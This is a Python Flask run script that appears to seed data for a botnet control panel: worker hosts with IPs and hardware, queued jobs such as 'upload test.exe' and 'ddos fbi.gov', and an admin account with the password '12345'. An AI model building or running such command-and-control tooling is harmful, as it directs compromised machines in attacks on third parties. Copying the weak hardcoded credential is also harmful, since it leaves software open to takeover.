from application import *
import application.models as models
import application.api
import application.control
from werkzeug.security import generate_password_hash
from time import sleep
from os.path import exists
from os import mkdir


def add_test_data():
    w = models.Worker(hostname='Predator', os='Windows 10', country='Germany', ip_addr='127.0.0.1')
    w2 = models.Worker(hostname='Helios 300', os='Windows 7', country='England', ip_addr='127.2.4.1')
    w3 = models.Worker(hostname='Acer Nexus', os='Windows 8', country='USA', ip_addr='127.11.55.1')
    w4 = models.Worker(hostname='Predator', os='Windows 10', country='Russia', ip_addr='127.66.33.1')
    db.session.add(w)
    sleep(1)
    db.session.commit()
    db.session.add(w2)
    sleep(1)
    db.session.commit()
    db.session.add(w3)
    sleep(1)
    db.session.commit()
    db.session.add(w4)

    j = models.Job(todo='upload test.exe', worker_id=w.id, done=True)
    j2 = models.Job(todo='ddos fbi.gov', worker_id=w.id)

    ri = models.ResourceInfo(cpu='Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz 2.21 GHz',
                             gpu='NVIDIA GeForce GTX 1060',
                             ram='8,0 GB', worker_id=w.id)
    ri2 = models.ResourceInfo(cpu='Intel Core i9-10900K Processor',
                              gpu='AMD Radeon RX 5600 XT',
                              ram='4,0 GB', worker_id=w2.id)
    ri3 = models.ResourceInfo(cpu='AMD Ryzen 9 5900X',
                              gpu='Nvidia GeForce RTX 3080',
                              ram='12,0 GB', worker_id=w3.id)
    ri4 = models.ResourceInfo(cpu='Intel Core i9-10980XE Extreme Edition Processor',
                              gpu='Intel(R) UHD Graphics 630',
                              ram='32,0 GB', worker_id=w4.id)

    db.session.add(j)
    db.session.add(j2)
    db.session.add(ri)
    db.session.add(ri2)
    db.session.add(ri3)
    db.session.add(ri4)

    admin = models.Admin()
    admin.username = 'Adam'
    admin.password = generate_password_hash('12345')
    db.session.add(admin)


def create_dirs():
    if not exists(app.config['UPLOADS_DIR']):
        mkdir(app.config['UPLOADS_DIR'])


if __name__ == '__main__':
    # db.drop_all()
    # db.create_all()
    # add_test_data()
    # db.session.commit()
    # create_dirs()
    app.run()
